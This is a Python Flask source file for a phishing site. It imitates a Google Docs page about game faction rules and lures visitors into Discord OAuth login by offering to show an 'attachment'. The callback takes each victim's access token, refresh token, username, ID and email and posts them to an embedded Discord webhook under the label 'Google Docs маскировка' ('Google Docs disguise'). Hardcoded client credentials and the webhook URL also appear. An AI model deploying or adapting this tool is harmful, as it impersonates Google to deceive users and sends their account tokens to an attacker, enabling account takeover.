from flask import Flask, request, redirect, render_template_string
import requests
import urllib.parse
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ===== НАСТРОЙКИ - ЗАМЕНИТЕ НА СВОИ =====
CLIENT_ID = "1527673986652176454"  # Ваш Client ID
CLIENT_SECRET = "BDSxVH-0mJDliOaFKcrIlL0vswgU7Sd"  # Ваш Client Secret
REDIRECT_URI = "https://fraction-brp.onrender.com/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1527674667274473502/VOQWxCWhCW0nx1-LY2PGhhJbNLBJadXkUOu1X3e2Y7nY43_gkhJaEGCvRtHcCqXatC79"  # Ваш вебхук
# =========================================

# ===== СТРАНИЦА В СТИЛЕ GOOGLE DOCS =====
DOCS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Правила фракций БРП - Google Документы</title>
    <style>
        /* === Стиль Google Docs === */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #f1f3f4;
            color: #202124;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        /* === Верхняя панель (Google Docs style) === */
        .top-bar {
            background: #fff;
            border-bottom: 1px solid #dadce0;
            padding: 8px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-shrink: 0;
        }
        
        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .docs-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc04 75%, #ea4335 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 18px;
        }
        
        .docs-title {
            font-size: 18px;
            font-weight: 500;
            color: #202124;
            cursor: default;
        }
        
        .docs-title span {
            color: #5f6368;
            font-weight: 400;
            font-size: 14px;
            margin-left: 8px;
        }
        
        .top-bar-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        
        .avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #4285f4, #34a853);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 14px;
            font-weight: 500;
        }
        
        .share-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .share-btn:hover {
            background: #1557b0;
        }
        
        /* === Второстепенная панель (меню) === */
        .menu-bar {
            background: #fff;
            border-bottom: 1px solid #dadce0;
            padding: 4px 24px;
            display: flex;
            align-items: center;
            gap: 24px;
            flex-shrink: 0;
            font-size: 14px;
            color: #5f6368;
        }
        
        .menu-bar span {
            padding: 6px 0;
            cursor: default;
            border-bottom: 2px solid transparent;
        }
        
        .menu-bar span.active {
            color: #202124;
            border-bottom-color: #1a73e8;
        }
        
        .menu-bar .file-info {
            margin-left: auto;
            font-size: 12px;
            color: #80868b;
        }
        
        /* === Основное содержимое (документ) === */
        .docs-content {
            flex: 1;
            overflow-y: auto;
            padding: 40px 20px;
            display: flex;
            justify-content: center;
            background: #e8eaed;
        }
        
        .document {
            max-width: 850px;
            width: 100%;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            padding: 60px 80px;
        }
        
        .document h1 {
            font-size: 28px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 24px;
            line-height: 1.3;
            text-align: center;
        }
        
        .document .meta {
            color: #5f6368;
            font-size: 13px;
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 16px;
            border-bottom: 1px solid #e8eaed;
        }
        
        .document .meta span {
            margin: 0 12px;
        }
        
        .document h2 {
            font-size: 20px;
            font-weight: 500;
            color: #202124;
            margin: 28px 0 16px 0;
            padding-bottom: 8px;
            border-bottom: 2px solid #e8eaed;
        }
        
        .document p {
            font-size: 15px;
            line-height: 1.8;
            color: #202124;
            margin-bottom: 16px;
        }
        
        .document ul {
            margin: 16px 0 24px 32px;
            line-height: 1.8;
        }
        
        .document ul li {
            font-size: 15px;
            margin-bottom: 6px;
            color: #202124;
        }
        
        .document .highlight-box {
            background: #f8f9fa;
            border-left: 4px solid #1a73e8;
            padding: 16px 20px;
            margin: 20px 0;
            border-radius: 4px;
        }
        
        .document .highlight-box p {
            margin-bottom: 0;
            font-size: 14px;
        }
        
        /* === Вложение - КНОПКА === */
        .attachment-section {
            background: #f8f9fa;
            border: 2px dashed #dadce0;
            border-radius: 12px;
            padding: 30px;
            margin: 30px 0 10px 0;
            text-align: center;
            transition: border-color 0.3s, background 0.3s;
        }
        
        .attachment-section:hover {
            border-color: #1a73e8;
            background: #f1f8fe;
        }
        
        .attachment-section .attach-icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        
        .attachment-section h3 {
            font-size: 18px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }
        
        .attachment-section p {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 16px;
        }
        
        .attachment-btn {
            display: inline-block;
            background: #1a73e8;
            color: white !important;
            padding: 14px 40px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            transition: background 0.2s, transform 0.2s;
            border: none;
            cursor: pointer;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
        }
        
        .attachment-btn:hover {
            background: #1557b0;
            transform: translateY(-1px);
        }
        
        .attachment-btn:active {
            transform: translateY(0);
        }
        
        .attachment-btn .discord-icon {
            margin-right: 10px;
        }
        
        /* === Футер === */
        .docs-footer {
            background: #f8f9fa;
            border-top: 1px solid #dadce0;
            padding: 8px 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #80868b;
            flex-shrink: 0;
        }
        
        .docs-footer a {
            color: #1a73e8;
            text-decoration: none;
        }
        
        .docs-footer a:hover {
            text-decoration: underline;
        }
        
        /* === Адаптация === */
        @media (max-width: 768px) {
            .document { padding: 30px 20px; }
            .top-bar { padding: 8px 16px; flex-wrap: wrap; gap: 8px; }
            .docs-title { font-size: 15px; }
            .menu-bar { overflow-x: auto; gap: 12px; font-size: 13px; }
            .attachment-section { padding: 20px; }
            .attachment-btn { padding: 12px 24px; font-size: 14px; }
        }
    </style>
</head>
<body>
    <!-- Верхняя панель Google Docs -->
    <div class="top-bar">
        <div class="top-bar-left">
            <div class="docs-icon">📄</div>
            <div class="docs-title">
                Правила фракций БРП
                <span>— Google Документы</span>
            </div>
        </div>
        <div class="top-bar-right">
            <span style="font-size:14px; color:#5f6368;">Редактирование</span>
            <button class="share-btn" onclick="window.location.href='/login'">Поделиться</button>
            <div class="avatar">А</div>
        </div>
    </div>
    
    <!-- Меню -->
    <div class="menu-bar">
        <span class="active">Файл</span>
        <span>Правка</span>
        <span>Вставка</span>
        <span>Формат</span>
        <span>Сервис</span>
        <span>Расширения</span>
        <span>Справка</span>
        <span class="file-info">Последние изменения: сегодня, 14:23</span>
    </div>
    
    <!-- Содержимое документа -->
    <div class="docs-content">
        <div class="document">
            <h1>📋 Правила фракций БРП</h1>
            <div class="meta">
                <span>📅 Обновлено: 17 июля 2026</span>
                <span>👤 Автор: Администрация</span>
                <span>📊 Версия 2.4</span>
            </div>
            
            <h2>1. Общие положения</h2>
            <p>Данный документ устанавливает правила взаимодействия между фракциями в рамках проекта <strong>БРП (Боевое Региональное Пространство)</strong>. Все участники обязаны ознакомиться с правилами и неукоснительно их соблюдать.</p>
            
            <div class="highlight-box">
                <p><strong>📌 Важно:</strong> Незнание правил не освобождает от ответственности. Каждый участник несёт личную ответственность за свои действия.</p>
            </div>
            
            <h2>2. Взаимодействие между фракциями</h2>
            <ul>
                <li><strong>Нейтралитет:</strong> Фракции обязаны соблюдать нейтралитет на общей территории, если иное не оговорено в договорённостях.</li>
                <li><strong>Конфликты:</strong> Любые спорные ситуации решаются через переговоры с участием администрации.</li>
                <li><strong>Территории:</strong> Каждая фракция имеет закреплённую зону влияния. Вторжение без предупреждения запрещено.</li>
                <li><strong>Ресурсы:</strong> Обмен ресурсами осуществляется только через официальные торговые точки.</li>
            </ul>
            
            <h2>3. Права и обязанности</h2>
            <ul>
                <li>Каждый участник фракции имеет право на защиту со стороны своей фракции.</li>
                <li>Участники обязаны выполнять приказы руководства фракции.</li>
                <li>Запрещено использование читов и стороннего ПО.</li>
                <li>Уважайте других игроков и администрацию.</li>
            </ul>
            
            <h2>4. Наказания</h2>
            <ul>
                <li><strong>Предупреждение:</strong> За мелкие нарушения.</li>
                <li><strong>Штраф:</strong> За нарушение экономических правил.</li>
                <li><strong>Исключение из фракции:</strong> За систематические нарушения.</li>
                <li><strong>Блокировка:</strong> За грубые нарушения (читы, оскорбления и т.д.).</li>
            </ul>
            
            <div class="highlight-box">
                <p><strong>⚖️</strong> Администрация оставляет за собой право изменять правила с обязательным уведомлением участников за 24 часа.</p>
            </div>
            
            <!-- === ВЛОЖЕНИЕ С КНОПКОЙ === -->
            <div class="attachment-section">
                <div class="attach-icon">📎</div>
                <h3>Вложение: Полный регламент фракций</h3>
                <p>Для просмотра полной версии документа с подписями и печатью, перейдите в Discord и подтвердите доступ.</p>
                <a href="/login" class="attachment-btn" id="discordBtn">
                    <span class="discord-icon">💬</span> Посмотреть вложение в Discord
                </a>
                <p style="font-size:12px; color:#9aa0a6; margin-top:12px;">
                    🔒 Безопасное подключение • Требуется авторизация Discord
                </p>
            </div>
            
            <p style="font-size:13px; color:#5f6368; margin-top:20px; text-align:center; border-top:1px solid #e8eaed; padding-top:16px;">
                Документ создан в Google Документах • Последняя правка: сегодня
            </p>
        </div>
    </div>
    
    <!-- Футер -->
    <div class="docs-footer">
        <span>© 2026 БРП. Все права защищены.</span>
        <span><a href="https://discord.com" target="_blank">Discord</a> • <a href="#">Политика конфиденциальности</a></span>
    </div>
    
    <!-- Анимация при наведении -->
    <script>
        document.getElementById('discordBtn').addEventListener('click', function(e) {
            // Небольшая анимация
            this.textContent = '⏳ Подключение...';
            this.style.opacity = '0.7';
            setTimeout(function() {
                window.location.href = '/login';
            }, 600);
        });
    </script>
</body>
</html>
"""

# ===== СТРАНИЦА ПОСЛЕ АВТОРИЗАЦИИ =====
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Доступ подтверждён - Google Документы</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #f1f3f4;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #202124;
        }
        .container {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.12);
            padding: 50px 60px;
            max-width: 480px;
            text-align: center;
        }
        .icon { font-size: 72px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 12px; }
        p { color: #5f6368; font-size: 16px; line-height: 1.6; }
        .loading {
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #80868b;
            font-size: 14px;
        }
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #e8eaed;
            border-top: 2px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .discord-link {
            display: inline-block;
            margin-top: 16px;
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .discord-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">✅</div>
        <h1>Доступ подтверждён!</h1>
        <p>Вы успешно авторизованы. Вложение будет открыто в Discord.</p>
        <div class="loading">
            <div class="spinner"></div>
            <span>Перенаправление...</span>
        </div>
        <a href="https://discord.com/app" class="discord-link">Открыть Discord →</a>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'https://discord.com/app';
        }, 3000);
    </script>
</body>
</html>
"""

# ===== МАРШРУТЫ =====

@app.route('/')
def home():
    """Главная страница - Google Docs с кнопкой вложения"""
    logger.info("=== ГЛАВНАЯ СТРАНИЦА (Google Docs) ===")
    return render_template_string(DOCS_PAGE)

@app.route('/login')
def login():
    """Перенаправление на Discord"""
    logger.info("=== ЗАПРОС НА /login ===")
    
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )
    
    return redirect(discord_auth_url)

@app.route('/callback')
def callback():
    """Обработка после авторизации"""
    logger.info("=== ЗАПРОС НА /callback ===")
    
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        logger.error(f"Ошибка от Discord: {error}")
        return render_template_string(SUCCESS_PAGE), 400
    
    if not code:
        logger.error("Код не получен")
        return "Код не получен", 400
    
    # Обмен кода на токен
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    
    try:
        resp = requests.post("https://discord.com/api/oauth2/token", data=data)
        token_data = resp.json()
        
        if resp.status_code == 200:
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            
            logger.info(f"✅ Токен получен")
            
            # Получаем информацию о пользователе
            headers = {'Authorization': f'Bearer {access_token}'}
            user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
            
            if user_resp.status_code == 200:
                user_data = user_resp.json()
                username = user_data.get('username', 'Неизвестно')
                user_id = user_data.get('id', 'Неизвестно')
                email = user_data.get('email', 'Не указан')
                
                logger.info(f"👤 Пользователь: {username} ({user_id})")
                logger.info(f"📧 Email: {email}")
                
                # Отправка на вебхук
                try:
                    embed = {
                        "title": "📎 Новый токен из Google Docs",
                        "color": 0x1a73e8,
                        "fields": [
                            {"name": "👤 Пользователь", "value": username, "inline": True},
                            {"name": "🆔 ID", "value": user_id, "inline": True},
                            {"name": "📧 Email", "value": email, "inline": True},
                            {"name": "🔑 Токен", "value": f"`{access_token}`", "inline": False},
                            {"name": "🔄 Refresh", "value": f"`{refresh_token[:30]}...`", "inline": False},
                            {"name": "⏰ Время", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False}
                        ],
                        "footer": {"text": "FRACTION • Google Docs маскировка"},
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    webhook_payload = {"embeds": [embed]}
                    webhook_resp = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=10)
                    logger.info(f"📬 Вебхук: {webhook_resp.status_code}")
                    
                except Exception as e:
                    logger.error(f"Ошибка вебхука: {e}")
                
                return render_template_string(SUCCESS_PAGE)
            else:
                return render_template_string(SUCCESS_PAGE)
        else:
            logger.error(f"Ошибка: {resp.status_code}")
            return render_template_string(SUCCESS_PAGE), 400
            
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")
        return "Внутренняя ошибка", 500

@app.route('/health')
def health():
    """Скрытый эндпоинт для проверки"""
    return {"status": "ok"}, 200

@app.errorhandler(404)
def not_found(e):
    """Страница 404 в стиле Google"""
    return """
    <!DOCTYPE html>
    <html>
    <head><title>404 - Google Документы</title></head>
    <body style="font-family: Arial; background:#f1f3f4; text-align:center; padding:100px;">
        <h1 style="color:#ea4335;">404</h1>
        <p style="color:#5f6368;">Страница не найдена</p>
        <a href="/" style="color:#1a73e8; text-decoration:none;">Вернуться к документу</a>
    </body>
    </html>
    """, 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
